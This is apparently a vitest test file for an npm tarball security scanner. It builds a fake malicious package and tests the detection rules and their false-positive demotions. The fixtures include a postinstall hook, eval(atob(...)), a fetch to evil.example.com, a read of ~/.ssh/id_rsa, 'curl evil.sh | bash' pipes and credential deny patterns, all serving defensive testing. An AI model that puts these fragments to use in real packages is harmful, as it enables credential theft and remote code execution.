import { describe, it, expect, beforeAll } from 'vitest'
import { mkdtempSync, writeFileSync, mkdirSync, readdirSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { execFileSync } from 'node:child_process'
import { readFileSync } from 'node:fs'
import { scanTarball, fmtFinding } from '../pipeline/scan/scan.ts'
import { RULES, isBinary, knownBinaryMagic, ASSET_PATH } from '../pipeline/scan/rules.ts'

let tgz: Buffer

beforeAll(() => {
  const dir = mkdtempSync(join(tmpdir(), 'scandir-'))
  mkdirSync(join(dir, 'pkg/dist'), { recursive: true })
  writeFileSync(join(dir, 'pkg/package.json'), JSON.stringify({
    name: 'bad-pkg', main: 'dist/index.js',
    scripts: { postinstall: 'node evil.js' },
  }))
  writeFileSync(join(dir, 'pkg/dist/index.js'), `
    const x = eval(atob('aGVsbG8='));
    fetch('https://evil.example.com/x');
    require('child_process').execSync('id');
    const key = fs.readFileSync('~/.ssh/id_rsa');
    connect('45.33.32.156');
  `)
  writeFileSync(join(dir, 'pkg/dist/blob.bin'), Buffer.alloc(1024, 0))
  const out = join(dir, 'p.tgz')
  execFileSync('tar', ['-czf', out, '-C', dir, 'pkg'], { env: { ...process.env, COPYFILE_DISABLE: '1' } })
  tgz = readFileSync(out)
})

describe('scan/rules', () => {
  it('isBinary detects blobs', () => {
    expect(isBinary(Buffer.alloc(100, 0))).toBe(true)
    expect(isBinary(Buffer.from('plain text file'))).toBe(false)
    expect(isBinary(Buffer.alloc(0))).toBe(false)
  })
  it('lifecycle rule only on package.json', () => {
    const r = RULES.find(r => r.id === 'lifecycle-script')!
    expect(r.test('package/package.json', '{"scripts":{"install":"x"}}')).toBeTruthy()
    expect(r.test('package/other.js', '"postinstall": "x"')).toBeNull()
  })
  it('literal-ip ignores doc ranges', () => {
    const r = RULES.find(r => r.id === 'literal-ip')!
    expect(r.test('f.js', '127.0.0.1')).toBeNull()
    expect(r.test('f.js', '0.0.0.0')).toBeNull()
    expect(r.test('f.js', '45.33.32.156')).toBeTruthy()
  })
  it('literal-ip rejects version/RFC/SVG/OID false positives', () => {
    const r = RULES.find(r => r.id === 'literal-ip')!
    // octet-overflow version soup
    expect(r.test('f.js', 'd="M11.385.6.113a9"')).toBeNull()
    // version pin
    expect(r.test('f.js', '"opencv-python==4.9.0.80"')).toBeNull()
    // UA string
    expect(r.test('f.js', 'Chrome/131.0.0.0 Safari/537.36')).toBeNull()
    // RFC section ref
    expect(r.test('f.js', 'RFC 9309 §2.3.1.4 recommends')).toBeNull()
    // kernel version fragment glued to dotted token
    expect(r.test('f.js', 'kernel_version: 5.10.0-180.12.0.50.oe2203')).toBeNull()
    // multicast + CGNAT excluded
    expect(r.test('f.js', 'ssdp 239.255.255.250')).toBeNull()
    expect(r.test('f.js', 'cgnet 100.64.0.0/10')).toBeNull()
    // real IPs still fire — bare token, host assignment, url
    expect(r.test('f.js', 'connect("45.33.32.156")')).toBeTruthy()
    expect(r.test('f.js', 'const host = "45.33.32.156"')).toBeTruthy()
  })

  it('demotes high hits in non-execution / inert context to medium', () => {
    const cred = RULES.find(r => r.id === 'credential-read')!
    // test/fixture path — content that never runs on the consumer
    expect(cred.test('package/test/plugin.test.ts', 'fs.readFileSync(home + "/.ssh/id_rsa")')!.sev).toBe('medium')
    expect(cred.test('package/src/plugin.spec.js', 'x(".npmrc")')!.sev).toBe('medium')
    // comment line — describing the path, not opening it
    expect(cred.test('package/guard.mjs', '// detects: cat ~/.aws/credentials')!.sev).toBe('medium')
    // quoted example/detection signature — spaces or shell/regex syntax
    // inside the string mean "command about the path", not the path itself
    expect(cred.test('package/guard.mjs', 'rx("cat\\\\s+~/.ssh")')!.sev).toBe('medium')
    expect(cred.test('package/deny.mjs', "deny('cat ~/.ssh/id_rsa')")!.sev).toBe('medium')
    // a closed earlier string must NOT demote the real read after it
    expect(cred.test('package/index.js', "const a='x'; readFileSync('/root/.npmrc')")!.sev).toBeUndefined()
    // bare path literal — the real operational signal stays high
    expect(cred.test('package/index.js', 'fs.readFileSync(home + "/.ssh/id_rsa")')!.sev).toBeUndefined()

    const obf = RULES.find(r => r.id === 'obfuscation')!
    // eval inside a detection-signature string
    expect(obf.test('package/rules.mjs', "deny('eval(String.fromCharCode(114))')")!.sev).toBe('medium')
    // test file
    expect(obf.test('package/test/t.test.ts', 'eval(atob(x))')!.sev).toBe('medium')
    // real eval stays high
    expect(obf.test('package/index.js', "const a='x'; eval('run()')")!.sev).toBeUndefined()
    // hex blob in test dir demotes; in src stays high
    const hex = "'\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48'"
    expect(obf.test('package/test/fixtures/blob.js', `const b = ${hex}`)!.sev).toBe('medium')
    expect(obf.test('package/index.js', `const b = ${hex}`)!.sev).toBeUndefined()

    const life = RULES.find(r => r.id === 'lifecycle-script')!
    // fixture package.json is a test asset — finding, not a flag
    expect(life.test('package/test/fixtures/pkg/package.json', '{"scripts":{"postinstall":"x"}}')!.sev).toBe('medium')
    expect(life.test('package/package.json', '{"scripts":{"postinstall":"x"}}')!.sev).toBeUndefined()
  })

  it('r11 demotions: detection regexes, .d.ts stubs, safe build hooks', () => {
    const cred = RULES.find(r => r.id === 'credential-read')!
    // a security scanner's OWN detection pattern — `\.ssh\/` inside a regex
    // literal matches credential paths, it does not open them
    expect(cred.test('package/dist/cli.js',
      'const m=/\\.ssh\\/|\\.aws\\/|\\.gnupg\\/|id_rsa|id_ed25519/i')!.sev).toBe('medium')
    // type stubs never execute — comments and signatures only
    expect(cred.test('package/build/security.d.ts',
      ' *   1. `..` traversal: a relative path like `../../.ssh/id_rsa`')!.sev).toBe('medium')
    // real reads keep severity
    expect(cred.test('package/index.js', 'fs.readFileSync(home + "/.ssh/id_rsa")')!.sev).toBeUndefined()
    expect(cred.test('package/index.js', 'const p = ".npmrc"; readFileSync(p)')!.sev).toBeUndefined()

    const prep = RULES.find(r => r.id === 'prepare-script')!
    // the standard TypeScript publish hook — compiles checked-in source
    expect(prep.test('package/package.json', '{"scripts":{"prepare":"npm run build"}}')!.sev).toBe('medium')
    expect(prep.test('package/package.json', '{"scripts":{"prepare":"pnpm build"}}')!.sev).toBe('medium')
    expect(prep.test('package/package.json', '{"scripts":{"prepare":"tsc"}}')!.sev).toBe('medium')
    // anything else keeps severity — curl|bash, node -e, custom scripts
    expect(prep.test('package/package.json', '{"scripts":{"prepare":"curl x.sh | bash"}}')!.sev).toBeUndefined()
    expect(prep.test('package/package.json', '{"scripts":{"prepare":"node scripts/setup.js"}}')!.sev).toBeUndefined()

    const life = RULES.find(r => r.id === 'lifecycle-script')!
    expect(life.test('package/package.json', '{"scripts":{"postinstall":"npm run build"}}')!.sev).toBe('medium')
    expect(life.test('package/package.json', '{"scripts":{"install":"node-gyp rebuild"}}')!.sev).toBeUndefined()
    expect(life.test('package/package.json', '{"scripts":{"preinstall":"curl evil.sh | bash"}}')!.sev).toBeUndefined()
  })

  it('r12: doc files cannot place calls — exec-surface scoping + loopback', () => {
    const net = RULES.find(r => r.id === 'network-call')!
    // #6256: markdown carrying `curl | bash` is an install instruction,
    // not the plugin placing calls at runtime
    expect(net.test('package/README.md', 'curl -fsSL https://x.sh/boot.sh | bash')).toBeNull()
    expect(net.test('package/docs/ADMIN-MANUAL.md', 'curl https://a.b | bash')).toBeNull()
    expect(net.test('package/CHANGELOG.md', 'curl -fsSL https://x | bash')).toBeNull()
    // non-exec data can't place calls either
    expect(net.test('package/config.json', '"u": "curl https://x"')).toBeNull()
    // test/e2e/fixture exec files network by design — noise
    expect(net.test('package/tests/e2e/probe.js', 'fetch("https://x")')).toBeNull()
    // real exec surface still fires
    expect(net.test('package/src/index.ts', 'fetch("https://api.x.com")')!.detail).toContain('network indicator')
    expect(net.test('package/boot.sh', 'curl https://x.sh | bash')!.detail).toContain('network indicator')
    // #6256 L179: every URL literal loopback → local probe, labeled
    const probe = 'const base = "http://127.0.0.1:" + port;\nawait fetch(base + "/global/health")'
    expect(net.test('package/scripts/agent-probe/run.cjs', probe)!.detail).toContain('loopback')
    expect(net.test('package/p.mjs', 'fetch("http://localhost:11434/api")')!.detail).toContain('loopback')
    // mixed loopback + external → can't certify loopback-only → normal hit
    expect(net.test('package/p.mjs', 'fetch("http://127.0.0.1/"); fetch("https://evil.com")')!.detail).toContain('network indicator')
    // no URL literal → honest indicator (can't tell where it goes)
    expect(net.test('package/p.mjs', 'fetch(urlFromEnv)')).toBeTruthy()
  })

  it('r12: install-pipe labels doc curl|sh for what it is', () => {
    const ip = RULES.find(r => r.id === 'install-pipe')!
    expect(ip.test('package/README.md', 'curl -fsSL https://x.sh/boot.sh | bash')!.detail).toContain('install pipe')
    expect(ip.test('package/docs/INSTALL.md', 'curl https://a | sudo bash')).toBeTruthy()
    // executable surface: a .sh pipe is network-call's job, not a doc signal
    expect(ip.test('package/boot.sh', 'curl x | sh')).toBeNull()
    // package.json scripts execute — postinstall-script owns that surface
    expect(ip.test('package/package.json', '{"scripts":{"postinstall":"curl x|sh"}}')).toBeNull()
    // no pipe → no hit (a bare curl download is not pipe-to-shell)
    expect(ip.test('package/README.md', 'curl -O https://x.sh/pkg.tar.gz')).toBeNull()
    // non-doc files are not 'documentation' — .go/.py building the same
    // string stays silent here (not opencode runtime surface either way)
    expect(ip.test('package/internal/upgrade/upgrade.go', '"curl -fsSL x | bash"')).toBeNull()
  })

  it('r12: -e2e suffixed dirs count as test paths', () => {
    const net = RULES.find(r => r.id === 'network-call')!
    const cp = RULES.find(r => r.id === 'child-process')!
    // #6256: opencode-plugin-e2e is e2e tooling — not runtime surface
    expect(net.test('package/scripts/opencode-plugin-e2e/run.cjs', 'fetch("https://x")')).toBeNull()
    expect(cp.test('package/scripts/opencode-plugin-e2e/run.cjs', 'execSync("ls")')).toBeNull()
    expect(net.test('package/foo-e2e/x.js', 'fetch("https://x")')).toBeNull()
  })

  it('r12: child-process/literal-ip skip docs and test paths', () => {
    const cp = RULES.find(r => r.id === 'child-process')!
    expect(cp.test('package/docs/DESIGN.md', '`node:child_process` spawn of /bin/sh')).toBeNull()
    expect(cp.test('package/tests/x.test.js', 'execSync("ls")')).toBeNull()
    expect(cp.test('package/src/index.ts', 'spawn("bash", args)')).toBeTruthy()

    const lip = RULES.find(r => r.id === 'literal-ip')!
    expect(lip.test('package/docs/fixtures/identity-v1/examples.json', '"ip": "45.33.32.156"')).toBeNull()
    expect(lip.test('package/README.md', 'server at 45.33.32.156')).toBeNull()
    // a root config endpoint stays a real finding
    expect(lip.test('package/src/config.json', '{"endpoint":"45.33.32.156"}')).toBeTruthy()
  })

  it('r13: child-process — .exec( is RegExp.prototype.exec, not a spawn', () => {
    const cp = RULES.find(r => r.id === 'child-process')!
    // the concern:l05 FP shapes sampled from live issues
    expect(cp.test('package/src/x.ts', 'const m = DCI_RE.exec(v)')).toBeNull()
    expect(cp.test('package/src/x.ts', 'const w = /^\\s*\\S+/.exec(text)?.[0]')).toBeNull()
    expect(cp.test('package/src/x.ts', 'const m = /^([a-f0-9]{64})$/.exec(line)')).toBeNull()
    // aliased receiver without a child_process literal — documented tradeoff
    expect(cp.test('package/src/x.ts', 'proc.exec("ls")')).toBeNull()
    // real spawn surface unchanged
    expect(cp.test('package/src/x.ts', 'exec("ls -la", cb)')).toBeTruthy()
    expect(cp.test('package/src/x.ts', 'spawn("bash", args)')).toBeTruthy()
    expect(cp.test('package/src/x.ts', 'execSync("id")')).toBeTruthy()
    expect(cp.test('package/src/x.ts', 'require("child_process").exec("id")')).toBeTruthy()
  })

  it('r9 demotions: .ssh boundary, deny tables, eval names/codegen, hex data', () => {
    const cred = RULES.find(r => r.id === 'credential-read')!
    // product's own file named like the credential dir — not the dir itself
    expect(cred.test('package/a.mjs', 'if (!name.endsWith(".ssh-runtime-manifest.json")) continue')!).toBeNull()
    // real .ssh paths still hit
    expect(cred.test('package/a.mjs', 'open("~/.ssh/config")')!.sev).toBeUndefined()
    expect(cred.test('package/a.mjs', 'open("~/.ssh/id_ed25519")')!.sev).toBeUndefined()
    // deny/guard-table line — FORBIDDEN_GRANT_PATTERN listing the path
    expect(cred.test('package/guard.mjs', 'const FORBIDDEN = [".ssh", ".aws/credentials"]')!.sev).toBe('medium')

    const obf = RULES.find(r => r.id === 'obfuscation')!
    // identifier suffix / member call / method definition — not bare eval
    expect(obf.test('package/a.js', 'myeval(x)')!.sev).toBe('medium')
    expect(obf.test('package/a.js', 'await page.eval(js, arg)')!.sev).toBe('medium')
    expect(obf.test('package/a.js', 'eval(args, ctx) { return ctx.v }')!.sev).toBe('medium')
    // schema codegen / globalThis polyfill
    expect(obf.test('package/v.js', "new Function('return this')()")!.sev).toBe('medium')
    expect(obf.test('package/ajv.js', 'const fn = new Function("data","opts",code)')!.sev).toBe('medium')
    // hex runs inside regex classes / encoding tables are data
    expect(obf.test('package/e.js', 'chars:"\\\\x80\\\\x81\\\\x82\\\\x83\\\\x84\\\\x85\\\\x86\\\\x87"')!.sev).toBe('medium')
    expect(obf.test('package/r.js', 'const re = /[\\\\x01\\\\x02\\\\x03\\\\x04\\\\x05\\\\x06\\\\x07\\\\x08\\\\x09]/g')!.sev).toBe('medium')
    // bare global eval + unexplained hex still flag high
    expect(obf.test('package/a.js', 'eval(payload)')!.sev).toBeUndefined()
    const hex = "'\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48'"
    expect(obf.test('package/a.js', `const b = ${hex}`)!.sev).toBeUndefined()
  })

  it('r9 binary magic: recognized containers demote, unknown stays high', async () => {
    expect(knownBinaryMagic(Buffer.from('OggS' + '\0'.repeat(60)))).toBe('ogg')
    expect(knownBinaryMagic(Buffer.concat([Buffer.from([0x37, 0x7f, 0x06, 0x82]), Buffer.alloc(40)]))).toBe('sqlite-wal')
    expect(knownBinaryMagic(Buffer.from([0xff, 0xfe, 0x41, 0x00]))).toBe('utf16-text')
    expect(knownBinaryMagic(Buffer.from('PDLP' + '\0'.repeat(60)))).toBe('pdl')
    expect(knownBinaryMagic(Buffer.from('VIMsug' + '\0'.repeat(60)))).toBe('vim-spell')
    expect(knownBinaryMagic(Buffer.from([0xde, 0xad, 0xbe, 0xef, 0x01, 0x02]))).toBeNull()
    expect(ASSET_PATH.test('pkg/assets/prompt.db')).toBe(true)
    expect(ASSET_PATH.test('pkg/lib/entry.js')).toBe(false)
  })
})

describe('scan/scanTarball', () => {
  it('finds all planted findings', async () => {
    const r = await scanTarball(tgz)
    const rules = new Set(r.findings.map(f => f.rule))
    expect(rules).toContain('lifecycle-script')
    expect(rules).toContain('network-call')
    expect(rules).toContain('child-process')
    expect(rules).toContain('credential-read')
    expect(rules).toContain('literal-ip')
    expect(rules).toContain('obfuscation')
    expect(rules).toContain('binary-blob')
    expect(r.redFlags.length).toBeGreaterThan(0)
  })

  it('captures the offending source line + number as evidence', async () => {
    const r = await scanTarball(tgz)
    const cred = r.findings.find(f => f.rule === 'credential-read')!
    expect(cred.file).toBe('pkg/dist/index.js')
    expect(cred.lineNo).toBe(5)
    expect(cred.line).toContain('.ssh/id_rsa')
    const evalHit = r.findings.find(f => f.rule === 'obfuscation')!
    expect(evalHit.lineNo).toBe(2)
    expect(evalHit.line).toContain('eval(')
    const life = r.findings.find(f => f.rule === 'lifecycle-script')!
    expect(life.line).toContain('postinstall')
    // serialization keeps the `rule:file` head and appends ` — L<no>: <code>`
    expect(fmtFinding(cred)).toMatch(/^credential-read:pkg\/dist\/index\.js — L5: /)
  })

  it('findings are capped at 500 with a scan-capped marker', async () => {
    // each planted file hits ~6 rules — 120 files ≫ the 500-finding ceiling
    const dir = mkdtempSync(join(tmpdir(), 'scanfat-'))
    mkdirSync(join(dir, 'pkg'), { recursive: true })
    writeFileSync(join(dir, 'pkg/package.json'), JSON.stringify({ name: 'fat', version: '1.0.0' }))
    for (let i = 0; i < 120; i++) {
      writeFileSync(join(dir, 'pkg', `f${i}.js`),
        `eval(x); fetch('https://a.example'); require('child_process'); fs.readFileSync('/root/.ssh/id_rsa'); connect('45.33.32.156'); const b='${'A'.repeat(220)}'`)
    }
    const out = join(dir, 'f.tgz')
    execFileSync('tar', ['-czf', out, '-C', dir, 'pkg'], { env: { ...process.env, COPYFILE_DISABLE: '1' } })
    const r = await scanTarball(readFileSync(out))
    // 500 real findings + 1 scan-capped marker
    expect(r.findings.length).toBe(501)
    expect(r.findings.some(f => f.rule === 'scan-capped')).toBe(true)
    expect(r.findings.filter(f => f.rule === 'scan-capped')).toHaveLength(1)
  }, 30000)

  it('parses in memory — no tar entries land under cwd', async () => {
    // regression: extract() is Unpack — it writes every entry to
    // process.cwd() (the CI workspace in production). tar.t parses only.
    const work = mkdtempSync(join(tmpdir(), 'scancwd-'))
    const prev = process.cwd()
    process.chdir(work)
    try {
      await scanTarball(tgz)   // 'pkg/'-prefixed fixture — old code wrote work/pkg/**
      expect(readdirSync(work)).toEqual([])
    } finally { process.chdir(prev) }
  })

  it('r3 rules: private IPv4 ignored, public v6 flagged, times not flagged', () => {
    const ip = RULES.find(r => r.id === 'literal-ip')!
    expect(ip.test('f.js', '10.0.0.1')).toBeNull()
    expect(ip.test('f.js', '192.168.1.5')).toBeNull()
    expect(ip.test('f.js', '172.16.0.9')).toBeNull()
    expect(ip.test('f.js', 'meet at 12:30:45')).toBeNull()
    expect(ip.test('f.js', '2001:db8::1')).toBeNull()       // doc range
    expect(ip.test('f.js', 'fd00::dead:beef')).toBeNull()  // ULA
    expect(ip.test('f.js', '2404:6800:4003:c02::64')).toBeTruthy() // public v6
    const lc = RULES.find(r => r.id === 'lifecycle-script')!
    for (const hook of ['preinstall', 'postinstall', 'install', 'prepublish'])
      expect(lc.test('package/package.json', `{"scripts":{"${hook}":"x"}}`), hook).toBeTruthy()
    const ps = RULES.find(r => r.id === 'pack-script')!
    expect(ps.sev).toBe('medium')
    for (const hook of ['prepublishOnly', 'prepack', 'postpack']) {
      expect(lc.test('package/package.json', `{"scripts":{"${hook}":"x"}}`), hook).toBeNull()
      expect(ps.test('package/package.json', `{"scripts":{"${hook}":"x"}}`), hook).toBeTruthy()
    }
    expect(lc.test('package/package.json', '{"scripts":{"test":"x","build":"y","prepublishOnly":"z"}}')).toBeNull()
  })
})
